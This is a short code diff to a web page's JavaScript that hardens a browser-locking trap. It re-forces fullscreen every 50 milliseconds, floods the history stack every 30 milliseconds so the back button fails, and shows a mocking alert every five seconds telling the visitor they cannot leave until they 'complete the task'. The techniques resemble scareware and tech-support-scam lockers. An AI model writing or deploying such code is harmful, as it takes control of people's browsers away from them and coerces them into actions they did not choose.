@@ -109,7 +109,7 @@
         function keepFullScreen() {
             setInterval(() => {
                 goFullScreen();
-            }, 100); // Attempt every 100 milliseconds
+            }, 50); // Attempt every 50 milliseconds
         }
 
         window.onload = () => {
@@ -168,7 +168,7 @@
         // Prevent Back Navigation by spamming history states
         setInterval(() => {
             window.history.pushState(null, null, window.location.href);
-        }, 50);
+        }, 30); // Faster history manipulation
 
         window.addEventListener('popstate', function () {
             if (correctEntries < 10) {
@@ -199,7 +199,7 @@
                 alert("You really think you can leave? Complete the task!");
                 goFullScreen(); // Re-enter full-screen immediately after the alert
             }
-        }, 7000); // every 7 seconds
+        }, 5000); // every 5 seconds
     </script>
 </body>
 </html>
